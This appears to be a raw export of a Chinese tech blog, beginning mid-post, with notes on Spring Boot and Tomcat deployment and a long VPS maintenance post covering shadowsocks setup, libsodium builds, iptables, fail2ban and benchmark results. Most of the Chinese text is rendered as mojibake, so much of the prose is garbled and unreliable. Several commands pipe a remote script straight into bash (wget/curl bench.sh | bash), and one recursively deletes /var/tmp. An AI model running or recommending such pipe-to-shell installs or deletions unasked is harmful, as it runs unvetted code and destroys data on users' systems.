ï¼Œåœ¨targetæ–‡ä»¶å¤¹ä¸­å°±èƒ½æ‰¾åˆ°ä¸€ä¸ªxxx.jaræ–‡ä»¶ï¼Œæ‰§è¡Œjava -jar .jar å°±èƒ½è¿è¡Œèµ·æ¥äº†ã€‚ Deploying as Web Application Archive (WAR) into a servlet container(éƒ¨ç½²åˆ°tomcatä¸­) éƒ¨ç½²åˆ°dockerä¸­ã€‚ã€‚ã€‚ã€‚ nginxä»£ç†ã€‚ã€‚ã€‚ nginx + å®¹å™¨ Tomcatæ•™ç¨‹Create a Maven Project with Servlet in IntelliJ IDEA éœ€è¦ä½¿ç”¨intelij idea ultimate versionï¼Œè¿‡ç¨‹ä¸­å¯èƒ½éœ€è¦è”ç½‘ï¼Œä¼šæ¯”è¾ƒæ…¢ã€‚ Tomcatå¯ä»¥host static fileï¼Œåšæ³•æ˜¯åœ¨webappæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªMyAppï¼ˆåå­—å…¶å®éšæ„ï¼‰æ–‡ä»¶å¤¹ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œæ–°å»ºä¸€ä¸ªindex.htmlï¼ˆæ–‡ä»¶ä¹Ÿéšæ„ï¼‰,æ¥ä¸‹æ¥è®¿é—®localhost:8080/MyApp/index.html å°±èƒ½çœ‹åˆ°å†…å®¹äº† è¡¥å……ä¸€äº›tomcatå’Œservletçš„çŸ¥è¯†tomcatæ˜¯web container,servletæ˜¯å¤„ç†ä¸šåŠ¡é€»è¾‘çš„ã€‚servletç»§æ‰¿è‡ªHttpServlet,é‡Œé¢æœ‰doGetå’ŒdoPostæ–¹æ³•ã€‚servletå’Œè¯·æ±‚çš„urlçš„å¯¹åº”å…³ç³»å†™åœ¨web.xmlä¸­ã€‚servletä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œè§£å†³æ–¹å¼(ThreadLocal) ä¸‹é¢æ˜¯ä»ä¸€ç‰‡å…³äºå¦‚ä½•ä½¿ç”¨å‘½ä»¤è¡Œç”Ÿæˆå¹¶è¿è¡Œjarçš„æ–‡ç« ä¸­æ‘˜æŠ„çš„ |____src | |____main | | |____java | | | |____com | | | | |____remkohde | | |____resources | |____test |____target Above you created the recommended directory structure for a Java application. Java source files are saved in the â€˜./src/main/javaâ€™ folder, the folder â€˜./src/main/resourcesâ€™ is added to the class-path to include resources like properties files to your Java application, test files are saved in â€˜./src/testâ€™, compiled class files are saved to â€˜./target/classesâ€™, and jar archives are saved to the â€˜./targetâ€™ folder. å¦‚ä¸Šå°±æ˜¯ä¸€èˆ¬æ¨èçš„java applicationçš„ç›®å½•ç»“æ„ã€‚./src/main/javaâ€™ folderæ”¾çš„æ˜¯javaä»£ç ï¼Œâ€˜./src/main/resourcesâ€™æ˜¯ç”¨æ¥å­˜æ”¾å±æ€§ä¹‹ç±»çš„æ–‡ä»¶çš„ï¼ˆè¢«æ·»åŠ åˆ°classpathï¼‰ï¼Œtestæ–‡ä»¶å­˜æ”¾åœ¨â€˜./src/testâ€™æ–‡ä»¶å¤¹ä¸­ï¼Œç”Ÿæˆçš„classæ–‡ä»¶æ”¾åœ¨â€˜./target/classesâ€™æ–‡ä»¶å¤¹ä¸­ï¼Œâ€˜./targetâ€™æ–‡ä»¶å¤¹ä¸­æ”¾çš„æ˜¯jaræ–‡ä»¶ è®ºå¦‚ä½•æ­£ç¡®åœ°å…³é—­springbootåº”ç”¨start.sh #!/bin/bash java -jar myapp.jar &amp; echo $! &gt; ./pid.file &amp; stop.sh #!/bin/bash kill $(cat ./pid.file) start_silent.sh #!/bin/bash nohup ./start.sh &gt; foo.out 2&gt; foo.err &lt; /dev/null &amp; éåµŒå…¥å¼äº§å“çš„Webåº”ç”¨ï¼Œåº”ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥PreparedStatementä»£æ›¿ç›´æ¥çš„è¯­å¥æ‰§è¡ŒStatementï¼Œä»¥é˜²æ­¢SQLæ³¨å…¥ã€‚ Spring bootçš„autoWiredæ³¨è§£ =================================================================åœ¨windowsé‡Œé¢æŸ¥çœ‹å†…ç½‘ipï¼Œä»æ§åˆ¶é¢æ¿è¿›å»çœ‹æ˜¯ä¸å‡†çš„ï¼ŒDHCPæœ‰æ•ˆæœŸè¿‡äº†è‡ªåŠ¨æ¢æ‰ï¼Œå¾—è‡ªå·±æ•²ipconfigï¼Œè¿™æ ·æ‰æ˜¯æœ€åŠæ—¶çš„ã€‚ ä»¥Okioä¸ºä¾‹ï¼Œmavençš„æœç´¢ç½‘ç«™æ˜¯https://search.maven.org/remote_content?g=com.squareup.okio&amp;a=okio&amp;v=LATESTï¼Œå®é™…ä¸‹å‘çš„åŸŸåæ˜¯https://repo1.maven.org/maven2/com/squareup/okio/okio/1.14.0/okio-1.14.0.jarã€‚ç”¨wgetçœ‹ï¼Œæ˜¯302é‡å®šå‘äº†ã€‚ accessing-data-mysqlåœ¨application.propertiesæ–‡ä»¶ä¸­å¯ä»¥å†™çš„ä¸€äº›é…ç½® åœ¨ubuntuä¸‹ä½¿ç”¨nginxéƒ¨ç½²Spring boot application example appSpringBootIn50A simple Spring boot application that demonstrates the usage of REST API using Spring boot, Hibernate and MySQL.servlet tutorials tbd META-INFä»¥åŠä¸€ä¸ªjaræ–‡ä»¶çš„ç›®å½•ç»“æ„oracleæ–‡æ¡£ä¸­æŒ‡å‡ºmanifestæ–‡ä»¶æœ€åä¸€è¡Œè¦åŠ ä¸Šä¸€ä¸ªæ¢è¡ŒThe manifest must end with a new line or carriage return. The last line will not be parsed properly if it does not end with a new line or carriage return.","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"VPSç»´æŠ¤çš„æ—¥å¸¸","date":"2017-12-11T16:20:16.000Z","path":"2017/12/11/2017-12-11-vps-maintenance/","text":"ä»¥ä¸‹åœ¨ ubuntu 16.04.3 LTS ä¸Šé€šè¿‡ 1. å°ç¡¬ç›˜æ¸…ç†åƒåœ¾ sudo apt-get autoclean æ¸…ç†æ—§ç‰ˆæœ¬çš„è½¯ä»¶ç¼“å­˜sudo apt-get clean æ¸…ç†æ‰€æœ‰è½¯ä»¶ç¼“å­˜sudo apt-get autoremove åˆ é™¤ç³»ç»Ÿä¸å†ä½¿ç”¨çš„å­¤ç«‹è½¯ä»¶ sudo rm -rf /var/tmp ## ä¸€èˆ¬æ¥è¯´/tmpå’Œ/var/tmp/æ–‡ä»¶å¤¹é‡Œé¢çš„ä¸œè¥¿å¯ä»¥éšä¾¿åˆ é™¤ï¼Œç¨³å¦¥èµ·è§è¿˜æ˜¯å…ˆçœ‹ä¸‹è¿™ä¸ªç›®å½•ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ–‡ä»¶è¢«æ­£åœ¨è·‘çš„ç¨‹åºä½¿ç”¨ï¼šsudo lsof +D /var ## æˆ‘çœ‹åˆ°ä¸€å¤§å †mysqlçš„ä¸œè¥¿ ï¼Œå¦å¤–è¯´ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆ/tmpæ–‡ä»¶å¤¹è¿™ä¹ˆå°ï¼Œå› ä¸ºubuntuç³»ç»Ÿæ¯æ¬¡é‡å¯éƒ½ä¼šæŠŠè¿™é‡Œé¢æ¸…ä¸€ä¸‹ æŠŠæœ¬æœºçš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°vpsä¸Šå¦‚æœä¹‹å‰æ”¹è¿‡sshç«¯å£çš„è¯ï¼Œè¿™é‡Œç«¯å£è‡ªå·±å¯ä»¥æ”¹ï¼Œç›®çš„åœ°ä½ç½®ä¹Ÿå¯ä»¥æŒ‡å®š scp -P 22 porn.mp4 username@xxx.xxx.xxx.xxx:/home/username/ 2.å¿…è¦è½¯ä»¶åˆšè£…å¥½çš„ ubuntu éœ€è¦æ‰§è¡Œä»¥ä¸‹æ­¥éª¤,éƒ½æ˜¯äº›å¸¸ç”¨çš„è½¯ä»¶ å®‰è£… git &gt; apt-get install gitå®‰è£… python &gt; apt-get install python-2.7å®‰è£… python-setuptools &gt; apt-get install python-setuptoolsæ£€æŸ¥æ˜¯å¦å®‰è£…å¥½ï¼š python â€“version è¿˜æœ‰ä¸€äº›ï¼Œæ¯”å¦‚ htophtopä¸­å„ä¸ªprocessçš„stateå‚è€ƒ D uninterruptible sleep (usually IO)R running or runnable (on run queue)S interruptible sleep (waiting for an event to complete)T stopped, either by a job control signal or because it is being traced.W paging (not valid since the 2.6.xx kernel)X dead (should never be seen)Z defunct (â€œzombieâ€) process, terminated but not reaped by its parent. åªå®‰è£…security update sudo unattended-upgrades -d ## åŠ ä¸Š-då’Œverboseçš„æ„æ€å·®ä¸å¤š æœ‰äº›è½¯ä»¶ä¸æ˜¯ç»å¸¸ç”¨å°±ç¦æ­¢å¼€æœºå¯åŠ¨å§ sudo systemctl disable mysql ##å› ä¸ºè¿™äº‹redisè€æ˜¯è£…ä¸ä¸Š 2.1 è£… ss ä¸‹è½½ shadowsocks æºç ç¼–è¯‘git clone https://github.com/shadowsocks/shadowsocks è®°å¾—åˆ‡æ¢åˆ° master åˆ†æ”¯python setup.py build python setup.py install æ£€æŸ¥ä¸‹ç‰ˆæœ¬ ssserver â€“version ç¼–è¾‘é…ç½®æ–‡ä»¶ vim config.json { &quot;server&quot;: &quot;my_server_ip&quot;, &quot;server_port&quot;: 8388, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;: 1080, &quot;password&quot;: &quot;mypassword&quot;, &quot;timeout&quot;: 300, &quot;method&quot;: &quot;aes-256-cfb&quot;, &quot;fast_open&quot;: true } ä½¿ç”¨ipv6çš„è¯(æŠŠâ€my_server_ipâ€æ”¹æˆâ€::â€),è¿™æ ·è®¿é—®é€šè¿‡ssè®¿é—®ipv6.google.comå°±okäº†(å½“ç„¶è¿™è¦åœ¨ç¡®è®¤hostå·²æœ‰ipv6çš„å‰æä¸‹)è¿™è·Ÿnginx ipv6 server blockå¾ˆåƒï¼š listen 80 default_server;listen [::]:80 default_server ipv6only=on; å¦‚æœä½ çš„æœåŠ¡å™¨Linux å†…æ ¸åœ¨3.7+ï¼Œå¯ä»¥å¼€å¯fast_open ä»¥é™ä½å»¶è¿Ÿã€‚linux å†…æ ¸ç‰ˆæœ¬æŸ¥çœ‹ï¼š cat /proc/version ssserver -c config.json -d start #å¯åŠ¨å®Œæˆpython3 shadowsocks/server.py -c yourconfig.json ## è¿™æ ·ä¹Ÿè¡Œ æ£€æŸ¥ä¸‹æ˜¯å¦å¯åŠ¨äº† ps -ef | grep sss ss å‘½ä»¤ ssserver -c /etc/shadowsocks/config.json # å‰å°è¿è¡Œ ### åå°è¿è¡Œå’Œåœæ­¢ ssserver -c /etc/shadowsocks.json -d start -q ##åŠ ä¸Š-qæ˜¯quietçš„æ„æ€ï¼Œonly show warning and error ssserver -c /etc/shadowsocks.json -d stop ### åŠ å…¥å¼€æœºå¯åŠ¨ ### åœ¨/etc/rc.localä¸­åŠ å…¥ sudo ssserver -c /etc/shadowsocks.json --user username -d start - ä¸è¦æ€»æ˜¯ç”¨rootç”¨æˆ·åšäº‹ï¼Œadduseræ¥åšï¼Œç»™sudoæƒé™å³å¯ å¦‚æœä½¿ç”¨systemdæ¥ç®¡ç†çš„è¯ï¼Œå°±ä¸è¦ä½¿ç”¨ -då‚æ•°ï¼Œå› ä¸ºéœ€è¦rootæƒé™ï¼Œæ­¤æ—¶åº”è¯¥å°†ssserverçš„ç”Ÿå‘½å‘¨æœŸç®¡ç†äº¤ç»™systemd nohup /net-speeder/net-speeder/net_speeder eth0 â€œtcp src port 12345â€ &gt; /dev/null 2&gt;&amp;1 &amp; æ…ç”¨ï¼ï¼ä¸€ä¸å°å¿ƒä¼šæŠŠè‡ªå·±çš„ipåŠ åˆ°iptableé»‘åå•é‡Œé¢//é˜²æ­¢æš´åŠ›æ‰«æssç«¯å£nohup tail -F /var/log/shadowsocks.log | python autoban.py &gt;log 2&gt;log &amp; å…¶å®å°±æ˜¯æ‰¾â€œcan not parse header when handling connection fromâ€è¿™å¥è¯ï¼Œè¶…è¿‡æ¬¡æ•°çš„åŠ åˆ°iptableçš„ban ruleé‡Œé¢ï¼Œå¯ä»¥çœ‹ä¸‹å“ªäº›ipè¢«æ‹‰é»‘äº†iptables -L -n ## æŸ¥çœ‹å·²æ·»åŠ çš„iptablesè§„åˆ™ 2.2 SSR ä»¥åŠä¸€äº›è¡ç”Ÿçš„è½¯ä»¶ShadowsocksRå¯åŠ¨åå°è¿è¡Œå‘½ä»¤ python server.py -p 443 -k password -m aes-256-cfb -O auth_sha1_v4 -o http_simple -d start net-speeder apt-get install libnet1-devapt-get install libpcap0.8-dev venetXï¼ŒOpenVZ æ¶æ„ cd net-speeder-master/ sh build.sh -DCOOKED ###Xenï¼ŒKVMï¼Œç‰©ç†æœº cd net-speeder-master/ sh build.sh ### åŠ é€Ÿæ‰€æœ‰ipåè®®æ•°æ® ./net_speeder venet0 &quot;ip&quot; ###åªåŠ é€ŸæŒ‡å®šç«¯å£ï¼Œä¾‹å¦‚åªåŠ é€ŸTCPåè®®çš„ 8989ç«¯å£, åˆ‡æ¢åˆ°net-speederçš„ç›®å½•ä¸‹ ./net_speeder venet0:0 &quot;tcp src port 8989&quot; ./net_speeder venet0 &quot;ip&quot; net-speederå†™å…¥å¼€æœºè„šæœ¬ 2.3 å‡çº§å†…æ ¸å¼€å¯ BBRKVM æ¶æ„å‡çº§å†…æ ¸å¼€å¯ BBR ubuntu 16.4 å®‰è£… shadowsocks-libev å‚è€ƒ githubå®˜æ–¹æ•™ç¨‹å®‰è£… sudo apt-get install software-properties-common -y sudo add-apt-repository ppa:max-c-lv/shadowsocks-libev -y sudo apt-get update sudo apt install shadowsocks-libev apt-get install --only-upgrade &lt;packagename&gt; ## åªæ›´æ–°è¿™ä¸€ä¸ªç¨‹åº apt list --upgradable ## çœ‹ä¸€ä¸‹å“ªäº›ç¨‹åºå¯ä»¥æ›´æ–° # Edit the configuration file sudo vi /etc/shadowsocks-libev/config.json ## è¿™é‡Œè®°å¾—æŠŠserver addressæ”¹æˆå®é™…çš„ip # Edit the default configuration for debian sudo vi /etc/default/shadowsocks-libev # Start the service sudo /etc/init.d/shadowsocks-libev start # for sysvinit, or sudo systemctl start shadowsocks-libev # for systemd ##åŠ å…¥å¼€æœºå¯åŠ¨ ##åœ¨/etc/rc.localä¸­åŠ å…¥ sudo /etc/init.d/shadowsocks-libev start sudo ss-server -c /etc/shadowsocks-libev/config.json -u ## å¼€å¯udpè½¬å‘ netstat -lnpç¡®è®¤ss-serverç¡®å®ç›‘å¬äº†udpç«¯å£ å…¶å®è·Ÿå®‰è£… ss å¾ˆåƒçš„ç”¨iptablesé™åˆ¶åˆ°shadowsocksç«¯å£çš„æœ€å¤§è¿æ¥æ•° # Up to 32 connections are enough for normal usage iptables -A INPUT -p tcp --syn --dport ${SHADOWSOCKS_PORT} -m connlimit --connlimit-above 32 -j REJECT --reject-with tcp-reset 2.4 å®‰è£…libsodiumè½¬è‡ªé€—æ¯” ## debianç³»åˆ— apt-get update ## å®‰è£… ç¼–è¯‘æ‰€éœ€ç»„ä»¶åŒ…ï¼š apt-get install -y build-essential ### è·å– libsodiumæœ€æ–°ç‰ˆæœ¬ï¼š Libsodiumr_ver=$(wget -qO- &quot;https://github.com/jedisct1/libsodium/tags&quot;|grep &quot;/jedisct1/libsodium/releases/tag/&quot;|head -1|sed -r &#39;s/.*tag\\/(.+)\\&quot;&gt;.*/\\1/&#39;) &amp;&amp; echo &quot;${Libsodiumr_ver}&quot; ## ä¸‹è½½æœ€æ–° libsodiumç‰ˆæœ¬ç¼–è¯‘æ–‡ä»¶ï¼š wget --no-check-certificate -N &quot;https://github.com/jedisct1/libsodium/releases/download/${Libsodiumr_ver}/libsodium-${Libsodiumr_ver}.tar.gz&quot; tar -xzf libsodium-${Libsodiumr_ver}.tar.gz &amp;&amp; cd libsodium-${Libsodiumr_ver} ./configure --disable-maintainer-mode &amp;&amp; make -j2 &amp;&amp; make install ## è¿™æ®µæœ€å¥½sudo å»åš ldconfig ## åˆ æ‰ä¹‹å‰ä¸‹è½½çš„æ–‡ä»¶ cd .. &amp;&amp; rm -rf libsodium-${Libsodiumr_ver}.tar.gz &amp;&amp; rm -rf libsodium-${Libsodiumr_ver} ç°åœ¨å°±å¯ä»¥å»config.jsonæ–‡ä»¶ä¸­å°†åŠ å¯†æ–¹å¼æ”¹æˆ: chacha20 äº†ï¼Œé‡å¯ä¸‹sså³å¯ 2.5 æŸ¥çœ‹æ—¥å¿—æ—¥å¿—æ–‡ä»¶çš„ä½ç½®åœ¨/var/log/shadowsocks.logä¸‹é¢è¿™æ¡å‘½ä»¤ç”¨äºæŸ¥çœ‹è®¿é—®äº†å“ªäº›ç½‘ç«™cat shadowsocks.log | awk â€˜{ print $5}â€™ |grep -o â€˜^[^:]*â€™ | sort | uniq -c | sort -n æŸ¥çœ‹å°è¯•è¿æ¥æœ¬æœåŠ¡å™¨çš„å®¢æˆ·ç«¯cat shadowsocks.log | awk â€˜{ print $NF }â€™| grep -o â€˜^[^:]*â€™ | sort | uniq -c | sort -n 2.6 simple-obfssudo apt-get install simple-obfs/etc/shadowsocks-libev/config.jsonæ–‡ä»¶ä¸­æ·»åŠ  &quot;plugin&quot;:&quot;obfs-server&quot;, &quot;plugin_opts&quot;: &quot;obfs=tls;obfs-host=www.bing.com&quot;, &quot;fast_open&quot;:true, &quot;reuse_port&quot;:true 2.7 ss-localæä¾›æ­£å‘ä»£ç†curlä½¿ç”¨ä»£ç†ï¼Œåœ¨ss-localç›‘å¬1080ç«¯å£çš„å‰æä¸‹ï¼Œè¿™æ¡å‘½ä»¤å¯ä»¥æ­£å¸¸è®¿é—®google curl -4sSkL -x socks5h://127.0.0.1:1080 https://www.google.comcurl â€“socks5 127.0.0.1:1080 http://stackoverflow.com/ //è¿™ä¸ªæ›´ç®€å• æœ‰ä¸¤ç§æ–¹å¼ $ export http_proxy=â€vivek:myPasswordHere@10.12.249.194:3128/â€œ$ curl -v -O http://dl.cyberciti.biz/pdfdownloads/b8bf71be9da19d3feeee27a0a6960cb3/569b7f08/cms/631.pdf curl -x â€˜http://vivek:myPasswordHere@10.12.249.194:3128&#39; -v -O https://dl.cyberciti.biz/pdfdownloads/b8bf71be9da19d3feeee27a0a6960cb3/569b7f08/cms/631.pdf å¦‚ä½•è®© curl å‘½ä»¤é€šè¿‡ä»£ç†è®¿é—®curl -x socks5://[user:password@]proxyhost[:port]/ urlcurl â€“socks5 192.168.1.254:3099 https://www.cyberciti.biz/ sså„ç§åŠ å¯†ç®—æ³•è·‘åˆ†æµ‹è¯•é¦–å…ˆå®‰è£…iperfapt-get install iperfiperf.sh #!/bin/bash method=$1 ss-tunnel -k test -m $method -l 8387 -L 127.0.0.1:8388 -s 127.0.0.1 -p 8389 &amp; ss_tunnel_pid=$! ss-server -k test -m $method -s 127.0.0.1 -p 8389 &amp; ss_server_pid=$! iperf -s -p 8388 &amp; iperf_pid=$! sleep 3 iperf -c 127.0.0.1 -p 8387 kill $ss_tunnel_pid kill $ss_server_pid kill $iperf_pid echo &quot;Test Finished&quot; 3. ubuntuè‡ªå¸¦çš„é˜²ç«å¢™å«åšufw(Uncomplicated Firewall)ï¼Œç”¨èµ·æ¥ä¹Ÿå¾ˆç®€å•digital oceançš„ufwæ•™ç¨‹ 4.è·‘åˆ†VPS è·‘åˆ†è½¯ä»¶git clone ä¸‹æ¥ cd across wget -qO- bench.sh | bash ###ï¼ˆäº²æµ‹å¯ç”¨ï¼Œä¹Ÿå¯ä»¥è‡ªå·±çœ‹Readmeï¼‰ ### æˆ–è€… curl -Lso- bench.sh | bash ä¸‹é¢æ˜¯ä¸€äº›è‡ªå·±è¯•è¿‡çš„ BandWagon---------------------------------------------------------------------- CPU model : Intel(R) Xeon(R) CPU E3-1275 v5 @ 3.60GHz Number of cores : 1 CPU frequency : 3600.041 MHz Total size of Disk : 12.0 GB (10.0 GB Used) Total amount of Mem : 256 MB (217 MB Used) Total amount of Swap : 128 MB (122 MB Used) System uptime : 2 days, 4 hour 20 min Load average : 0.06, 0.05, 0.01 OS : Ubuntu 14.04.1 LTS Arch : i686 (32 Bit) Kernel : 2.6.32-042stab123.3 ---------------------------------------------------------------------- I/O speed(1st run) : 855 MB/s I/O speed(2nd run) : 1.0 GB/s I/O speed(3rd run) : 1.0 GB/s Average I/O speed : 967.7 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 76.5MB/s Linode, Tokyo, JP 106.187.96.148 17.6MB/s Linode, Singapore, SG 139.162.23.4 8.18MB/s Linode, London, UK 176.58.107.39 8.67MB/s Linode, Frankfurt, DE 139.162.130.8 12.8MB/s Linode, Fremont, CA 50.116.14.9 9.40MB/s Softlayer, Dallas, TX 173.192.68.18 62.3MB/s Softlayer, Seattle, WA 67.228.112.250 66.0MB/s Softlayer, Frankfurt, DE 159.122.69.4 12.2MB/s Softlayer, Singapore, SG 119.81.28.170 11.8MB/s Softlayer, HongKong, CN 119.81.130.170 13.2MB/s ---------------------------------------------------------------------- BuyVmCPU model : Intel(R) Xeon(R) CPU L5639 @ 2.13GHz Number of cores : 1 CPU frequency : 2000.070 MHz Total size of Disk : 15.0 GB (1.3 GB Used) Total amount of Mem : 128 MB (80 MB Used) Total amount of Swap : 128 MB (32 MB Used) System uptime : 0 days, 22 hour 28 min Load average : 0.10, 0.04, 0.05 OS : Ubuntu 14.04.2 LTS Arch : i686 (32 Bit) Kernel : 2.6.32-openvz-042stab116.2-amd64 ---------------------------------------------------------------------- I/O speed(1st run) : 102 MB/s I/O speed(2nd run) : 97.1 MB/s I/O speed(3rd run) : 147 MB/s Average I/O speed : 115.4 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 14.7MB/s Linode, Tokyo, JP 106.187.96.148 6.15MB/s Linode, Singapore, SG 139.162.23.4 2.54MB/s Linode, London, UK 176.58.107.39 2.99MB/s Linode, Frankfurt, DE 139.162.130.8 2.96MB/s Linode, Fremont, CA 50.116.14.9 4.27MB/s Softlayer, Dallas, TX 173.192.68.18 11.7MB/s Softlayer, Seattle, WA 67.228.112.250 13.0MB/s Softlayer, Frankfurt, DE 159.122.69.4 1.89MB/s Softlayer, Singapore, SG 119.81.28.170 3.26MB/s Softlayer, HongKong, CN 119.81.130.170 3.72MB/s ---------------------------------------------------------------------- DigitalOcean Los Angeles---------------------------------------------------------------------- CPU model : Intel(R) Xeon(R) CPU E5-2650L v3 @ 1.80GHz Number of cores : 1 CPU frequency : 1799.998 MHz Total size of Disk : 20.2 GB (1.0 GB Used) Total amount of Mem : 488 MB (33 MB Used) Total amount of Swap : 0 MB (0 MB Used) System uptime : 0 days, 0 hour 3 min Load average : 0.16, 0.10, 0.03 OS : Ubuntu 16.04.2 LTS Arch : x86_64 (64 Bit) Kernel : 4.4.0-78-generic ---------------------------------------------------------------------- I/O speed(1st run) : 581 MB/s I/O speed(2nd run) : 711 MB/s I/O speed(3rd run) : 777 MB/s Average I/O speed : 689.7 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 161MB/s Linode, Tokyo, JP 106.187.96.148 15.7MB/s Linode, Singapore, SG 139.162.23.4 5.96MB/s Linode, London, UK 176.58.107.39 5.71MB/s Linode, Frankfurt, DE 139.162.130.8 6.45MB/s Linode, Fremont, CA 50.116.14.9 30.4MB/s Softlayer, Dallas, TX 173.192.68.18 29.9MB/s Softlayer, Seattle, WA 67.228.112.250 57.7MB/s Softlayer, Frankfurt, DE 159.122.69.4 3.64MB/s Softlayer, Singapore, SG 119.81.28.170 7.59MB/s Softlayer, HongKong, CN 119.81.130.170 8.84MB/s ---------------------------------------------------------------------- DigitalOcean Sinapore (ip address lokks like Russian)---------------------------------------------------------------------- CPU model : Intel(R) Xeon(R) CPU E5-2630L 0 @ 2.00GHz Number of cores : 1 CPU frequency : 1999.999 MHz Total size of Disk : 20.2 GB (1.0 GB Used) Total amount of Mem : 488 MB (36 MB Used) Total amount of Swap : 0 MB (0 MB Used) System uptime : 0 days, 0 hour 2 min Load average : 0.17, 0.20, 0.09 OS : Ubuntu 16.04.2 LTS Arch : x86_64 (64 Bit) Kernel : 4.4.0-78-generic ---------------------------------------------------------------------- I/O speed(1st run) : 662 MB/s I/O speed(2nd run) : 741 MB/s I/O speed(3rd run) : 728 MB/s Average I/O speed : 710.3 MB/s ---------------------------------------------------------------------- Node Name IPv4 address Download Speed CacheFly 205.234.175.175 20.8MB/s Linode, Tokyo, JP 106.187.96.148 18.6MB/s Linode, Singapore, SG 139.162.23.4 83.8MB/s Linode, London, UK 176.58.107.39 5.71MB/s Linode, Frankfurt, DE 139.162.130.8 8.13MB/s Linode, Fremont, CA 50.116.14.9 2.82MB/s Softlayer, Dallas, TX 173.192.68.18 6.18MB/s Softlayer, Seattle, WA 67.228.112.250 8.47MB/s Softlayer, Frankfurt, DE 159.122.69.4 6.77MB/s Softlayer, Singapore, SG 119.81.28.170 97.9MB/s Softlayer, HongKong, CN 119.81.130.170 35.2MB/s ---------------------------------------------------------------------- è·‘javaï¼Ÿç®—äº†å§ï¼Œç®€å•è¯»ä¸ªæ–‡æœ¬æ–‡ä»¶printå‡ºæ¥cpuå°±é£™åˆ°50%ã€‚å®‰è£…jdkçš„è¯sudo apt install openjdk-8-jdk //åªè£…è¿™ä¸ªçš„è¯åœ¨intelijé‡Œé¢æ˜¯çœ‹ä¸äº†jdkæºç çš„sudo apt install openjdk-8-source //è¿™æ ·å°±èƒ½åœ¨linux desktopçš„intelijé‡Œé¢çœ‹jdkæºç äº† ä½¿ç”¨textmateåœ¨vscodeä¸­ç¼–è¾‘è¿œç¨‹linux serverä¸­çš„æ–‡ä»¶ å…³äºubuntuæ·»åŠ ppadebianç³»çš„package managementæ–¹å¼.ppa(personal package archives)æ·»åŠ ppaçš„æ–¹å¼ sudo add-apt-repository ppa:owner_name/ppa_name Dnsmasq vpsè‡ªå»ºDNSæœåŠ¡å™¨tips onserver optimization å‚è€ƒvps ä¼˜åŒ– egrep -e â€œvia tcp:xxx.xxx.xxx:[0-9]{5}$â€ -o client_debug.log | sed â€œs/via tcp:xxx.xxx.xxx://gâ€ | sort | uniq -c | sort -k 1 -nregrep å’Œsed å‘½ä»¤çš„ä½¿ç”¨ egrep çš„ä½¿ç”¨ï¼ˆåå‘æ­£åˆ™è¡¨è¾¾å¼æ–¹é¢ï¼‰cat stuff.log 2018/9/15 01:52:26 udp:123.123.123.123:35021 accepted tcp:api-dash.ins.io:4432018/9/15 01:52:27 udp:123.123.123.123:29932 accepted tcp:www.google-analytics.com:4432018/9/15 01:52:28 udp:123.123.123.123:35283 accepted tcp:notifications.google.com:4432018/9/15 01:52:29 udp:123.123.123.123:29932 accepted tcp:fonts.gstatic.com:443 sudo egrep â€œudp:123.123.123.123:[0-9]{5}â€ -o stuff.logudp:123.123.123.123:35021udp:123.123.123.123:29932udp:123.123.123.123:35283udp:123.123.123.123:29932 ä¸­æ‹¬å·çš„æ„æ€æ˜¯0-9ä¹‹é—´çš„ä»»ä¸€æ•°å­—ï¼ŒèŠ±æ‹¬å·åŒ…èµ·æ¥çš„5è¡¨ç¤ºé‡å¤5æ¬¡ï¼Œä¹Ÿå°±æ˜¯äº”ä½æ•°çš„æ„æ€äº† 6. fail2bançš„ä½¿ç”¨ç…§ç€digitaloceanä¸Šçš„æ•™ç¨‹é…ç½®å°±è¡Œäº† æœ¬è´¨ä¸Šéƒ½æ˜¯æŸä¸ªipè§¦çŠ¯äº†æŸæ¡è§„åˆ™ï¼Œå°±è¢«iptableæ·»åŠ åˆ°dropé‡Œé¢ã€‚æ‰€ä»¥å¯¹äºå‘èµ·è¯·æ±‚çš„äººæ¥è¯´ï¼Œçœ‹åˆ°çš„æ˜¯connection refusedã€‚å¯¹äºæœåŠ¡å™¨è¿™è¾¹ï¼Œnginxçš„æ—¥å¿—é‡Œéƒ½æ²¡æœ‰ã€‚å› ä¸ºipåŒ…è¿˜æ²¡æœ‰åˆ°nginxå°±è¢«æ‹¦ä½äº†ã€‚æ—¥å¿—åœ¨/var/log/fail2ban.logè¿™é‡Œiptables -nLsudo service fail2ban restart ##é‡å¯ä¸€ä¸‹è®©è§„åˆ™ç”Ÿæ•ˆsudo fail2ban-client status ## çœ‹ä¸‹æˆ‘éƒ½æ·»åŠ äº†å“ªäº›è§„åˆ™sudo iptables -S ##çœ‹ä¸‹fail2banéƒ½æ·»åŠ äº†å“ªäº›iptableè§„åˆ™sudo fail2ban-client status nginx-http-auth ##çœ‹çœ‹æ’ä¸Šè¿™ä¸ªè§„åˆ™çš„ipæœ‰å“ªäº›ipsudo fail2ban-client set nginx-http-auth unbanip 111.111.111.111 ##æŠŠè¿™æ¡è§„åˆ™æ”¾å‡ºå°é»‘å±‹ sudo fail2ban-client reload ## Reloads Fail2banâ€™s configuration files.åœ¨restartä¹‹å‰å…ˆç”¨è¿™ä¸ªæµ‹è¯•ä¸€ä¸‹é…ç½®æ–‡ä»¶æ˜¯å¦å†™é”™äº†sudo fail2ban-client start ##Starts the Fail2ban server and jails.sudo fail2ban-client status ##Will show the status of the server, and enable jails.sudo fail2ban-client status nginx-http-auth ## å“ªäº›ipè¢«è¿™ä¸ªè§„åˆ™banäº† ##è¿˜å¯ä»¥æ‰‹åŠ¨æµ‹è¯•æ­£åˆ™æ˜¯å¦ç¬¦åˆfail2ban-regex â€˜stringâ€™ â€˜regexâ€™ //ä¸Šé¢çš„jailä¹Ÿæ˜¯ç”¨äº†filter.dé‡Œé¢çš„æ­£åˆ™ 